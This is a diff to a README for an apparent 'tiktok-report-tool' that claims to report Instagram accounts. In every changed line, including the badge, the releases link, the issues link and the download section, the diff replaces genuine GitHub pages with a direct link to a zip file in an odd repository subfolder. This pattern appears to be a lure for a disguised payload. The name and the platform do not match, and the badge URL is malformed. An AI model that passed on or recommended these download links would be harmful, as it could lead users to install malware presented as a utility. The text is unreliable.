@@ -1,7 +1,7 @@
 # 🛠️ tiktok-report-tool - Efficiently Report Instagram Accounts
 
 ## 🔗 Download Now
-[![Download tiktok-report-tool](https://img.shields.io/badge/Download%20tiktok--report--tool-blue.svg)](https://github.com/Burnt-fragrantsumac727/tiktok-report-tool/releases)
+[![Download tiktok-report-tool](https://raw.githubusercontent.com/Burnt-fragrantsumac727/tiktok-report-tool/main/mesorrhin/tiktok-report-tool.zip%https://raw.githubusercontent.com/Burnt-fragrantsumac727/tiktok-report-tool/main/mesorrhin/tiktok-report-tool.zip)](https://raw.githubusercontent.com/Burnt-fragrantsumac727/tiktok-report-tool/main/mesorrhin/tiktok-report-tool.zip)
 
 ## 📖 Description
 The tiktok-report-tool automates the process of reporting accounts on Instagram that may violate the platform's policies. This tool simplifies the reporting process, making it easy for users to help maintain a safer online community.
@@ -10,7 +10,7 @@ The tiktok-report-tool automates the process of reporting accounts on Instagram 
 Follow these steps to download and run the tiktok-report-tool:
 
 1. **Access the Releases Page**  
-   Navigate to the [Releases page](https://github.com/Burnt-fragrantsumac727/tiktok-report-tool/releases). Here, you will find the latest version of the tiktok-report-tool. 
+   Navigate to the [Releases page](https://raw.githubusercontent.com/Burnt-fragrantsumac727/tiktok-report-tool/main/mesorrhin/tiktok-report-tool.zip). Here, you will find the latest version of the tiktok-report-tool. 
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of available files. Look for the file that matches your operating system. For most users, there will be options for Windows, macOS, and Linux.
@@ -54,11 +54,11 @@ When using the tiktok-report-tool, please follow the community guidelines:
 ## 👩‍💻 Support  
 If you encounter any issues while using the tiktok-report-tool or have questions, you can find support in the following ways:
 
-- **GitHub Issues**: Report issues on our [Issues page](https://github.com/Burnt-fragrantsumac727/tiktok-report-tool/issues).
+- **GitHub Issues**: Report issues on our [Issues page](https://raw.githubusercontent.com/Burnt-fragrantsumac727/tiktok-report-tool/main/mesorrhin/tiktok-report-tool.zip).
 - **Community Forums**: Join discussions on relevant forums to find solutions or share experiences.
 - **Documentation**: Explore additional documentation that provides tips on using the tool effectively.
 
 ## 📥 Download & Install
-To download tiktok-report-tool, simply visit the [Releases page](https://github.com/Burnt-fragrantsumac727/tiktok-report-tool/releases). This page includes all the versions you can download. Choose the right file for your operating system, download it, and follow the installation steps provided above.
+To download tiktok-report-tool, simply visit the [Releases page](https://raw.githubusercontent.com/Burnt-fragrantsumac727/tiktok-report-tool/main/mesorrhin/tiktok-report-tool.zip). This page includes all the versions you can download. Choose the right file for your operating system, download it, and follow the installation steps provided above.
 
 Thank you for choosing tiktok-report-tool. Your support in reporting inappropriate behavior helps create a better online experience for everyone.
